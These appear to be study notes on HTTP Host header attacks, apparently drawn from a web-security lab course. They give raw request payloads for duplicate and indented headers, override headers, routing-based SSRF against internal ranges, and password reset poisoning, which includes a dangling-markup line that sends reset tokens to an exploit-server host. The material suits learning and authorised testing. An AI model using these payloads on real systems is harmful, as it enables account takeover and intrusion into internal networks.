# HTTP Host header attacks
In short, you need to identify whether you are able to modify the Host header and still reach the target application with your request. If so, you can use this header to probe the application and observe what effect this has on the response.  
Some parsing algorithms will omit the port from the Host header, meaning that only the domain name is validated. If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you reach the target application, while potentially injecting a payload via the port.  

```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```
Other sites will try to apply matching logic to allow for arbitrary subdomains. In this case, you may be able to bypass the validation entirely by registering an arbitrary domain name that ends with the same sequence of characters as a whitelisted one:  
```
GET /example HTTP/1.1
Host: notvulnerable-website.com
```
Alternatively, you could take advantage of a less-secure subdomain that you have already compromised: 
```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```
## Inject duplicate Host headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```
Let's say the front-end gives precedence to the first instance of the header, but the back-end prefers the final instance. Given this scenario, you could use the first header to ensure that your request is routed to the intended target and use the second header to pass your payload into the server-side code.  
## Add line wrapping
You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's value. Other servers will ignore the indented header altogether. 
```
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```
The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. If the front-end ignores the indented header, the request will be processed as an ordinary request for vulnerable-website.com  
Now let's say the back-end ignores the leading space and gives precedence to the first header in the case of duplicates. This discrepancy might allow you to pass arbitrary values via the "wrapped" Host header.  
## Inject host override headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```
Other overriding headers:
* X-Host
* X-Forwarded-Server
* X-HTTP-Host-Override
* Forwarded
We can use `Param Miner` extension from Burp to guess headers  
## Web cache poisoning via the Host header
If Host header is reflected somehow in response and site uses web cache, we can use it to exploit web-cache poisoning attack  
For example we can add second Host header to change js file source  
## Exploiting classic server-side vulnerabilities
For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.  
Also some websites could use Host header to analyze privilege level. For example, we can access admin panel via changing `Host` value to localhost  
## Routing-based SSRF
Host header could be a potential vector for attack on load balancers, which receive traffic from public net and have access to internal network  
If we are able to manipulate host header, next step is to identify internal network or hostnames, If we aren't able to detect any, we can simply bruteforce default networks such as `192.168.0.0/16`  
We can test Host vulnerability by replacing Host value with Burp collaborator server and detect 200 response and coolaborator servver name in response.  
When scanning internal network with Burp Intruder, uncheck `Update Host header to match target`  
Another way to bypass Host restrictions is to use absolute url in GET request and use arbitrary Host header:
```
GET https://0ac900040418a9eb816f840c00fd0053.web-security-academy.net/ HTTP/2
Host: zdgrjgxy8z4v9ccpq8i5fcm9i0orcm0b.oastify.com
```

## Connection state attacks
For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater.  
For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection  
In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.  
Fo this purpose we can add two requests in group. First request will have normal Host header and `Connection` header set to keep-alive, while second request must have Host header with value of internal IP and `Connection` set top close. Next we sen group sequentially in single connection.  

## SSRF via a malformed request line
Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.  
For example, a reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. This works fine if the path starts with a / character, but what if starts with an @ character instead? 
The resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server.  

## Password reset poisoning
1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control
2. The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server
3. If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server
4. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter.  

Even if you can't control the password reset link, you can sometimes use the Host header to inject HTML into sensitive emails. Note that email clients typically don't execute JavaScript, but other HTML injection techniques like dangling markup attacks may still apply.  
We can add something like this to change host reflection in reset password mail:
```
Host: normal-host:'<a href="//exploit-0a6300c0039c728fc01880350103009d.exploit-server.net/?
```